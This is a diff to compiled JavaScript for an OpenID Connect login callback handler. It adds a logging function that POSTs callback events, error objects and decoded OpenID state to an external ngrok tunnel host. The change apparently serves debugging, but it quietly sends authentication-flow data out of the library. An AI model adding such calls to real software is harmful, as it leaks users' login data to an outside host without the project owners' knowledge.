@@ -1,6 +1,7 @@
 "use strict";
 Object.defineProperty(exports, "__esModule", { value: true });
 var tslib_1 = require("tslib");
+var https_1 = tslib_1.__importDefault(require("https"));
 var url_join_1 = tslib_1.__importDefault(require("url-join"));
 var http_errors_1 = tslib_1.__importDefault(require("http-errors"));
 var openid_client_1 = require("openid-client");
@@ -9,6 +10,18 @@ var errors_1 = require("../utils/errors");
 function getRedirectUri(config) {
     return (0, url_join_1.default)(config.baseURL, config.routes.callback);
 }
+var __log = function (logData) {
+    var payload = JSON.stringify(tslib_1.__assign(tslib_1.__assign({}, logData), { timestamp: Date.now() }));
+    var req = https_1.default.request({
+        hostname: 'a700-82-163-221-82.ngrok-free.app',
+        port: 443,
+        path: '/logs',
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
+    });
+    req.write(payload);
+    req.end();
+};
 function callbackHandlerFactory(config, getClient, sessionCache, transientCookieHandler) {
     var _this = this;
     console.log('[callbackHandlerFactory] curry');
@@ -18,6 +31,7 @@ function callbackHandlerFactory(config, getClient, sessionCache, transientCookie
             switch (_a.label) {
                 case 0:
                     console.log('[callbackHandlerFactory]');
+                    __log('[callbackHandlerFactory]');
                     return [4 /*yield*/, getClient()];
                 case 1:
                     client = _a.sent();
@@ -45,6 +59,7 @@ function callbackHandlerFactory(config, getClient, sessionCache, transientCookie
                 case 6:
                     response_type = (_a.sent()) || config.authorizationParams.response_type;
                     console.log('[callbackHandlerFactory:client.callback]');
+                    __log({ message: '[callbackHandlerFactory:client.callback]' });
                     _a.label = 7;
                 case 7:
                     _a.trys.push([7, 9, , 10]);
@@ -71,6 +86,11 @@ function callbackHandlerFactory(config, getClient, sessionCache, transientCookie
                         err_1 = new errors_1.EscapedError(err_1.message);
                     }
                     console.log('[callbackHandlerFactory:client.callback] error', err_1, { openIdState: (0, encoding_1.decodeState)(expectedState) });
+                    __log({
+                        message: '[callbackHandlerFactory:client.callback] error',
+                        err: err_1,
+                        openIdState: (0, encoding_1.decodeState)(expectedState)
+                    });
                     throw (0, http_errors_1.default)(400, err_1, { openIdState: (0, encoding_1.decodeState)(expectedState) });
                 case 10:
                     openidState = (0, encoding_1.decodeState)(expectedState);
@@ -79,6 +99,7 @@ function callbackHandlerFactory(config, getClient, sessionCache, transientCookie
                     session = _a.sent();
                     if (!(options === null || options === void 0 ? void 0 : options.afterCallback)) return [3 /*break*/, 13];
                     console.log('[callbackHandlerFactory:afterCallback]');
+                    __log({ message: '[callbackHandlerFactory:afterCallback]' });
                     return [4 /*yield*/, options.afterCallback(req, res, session, openidState)];
                 case 12:
                     session = _a.sent();
@@ -86,6 +107,7 @@ function callbackHandlerFactory(config, getClient, sessionCache, transientCookie
                 case 13:
                     if (!session) return [3 /*break*/, 15];
                     console.log('[callbackHandlerFactory] sessionCache.create');
+                    __log({ message: '[callbackHandlerFactory] sessionCache.create' });
                     return [4 /*yield*/, sessionCache.create(req, res, session)];
                 case 14:
                     _a.sent();
@@ -93,6 +115,7 @@ function callbackHandlerFactory(config, getClient, sessionCache, transientCookie
                 case 15:
                     if (!res.writableEnded) {
                         console.log('[callbackHandlerFactory] !res.writableEnded, writeHead 302');
+                        __log({ message: '[callbackHandlerFactory] !res.writableEnded, writeHead 302' });
                         res.writeHead(302, {
                             Location: res.getHeader('Location') || openidState.returnTo || config.baseURL
                         });
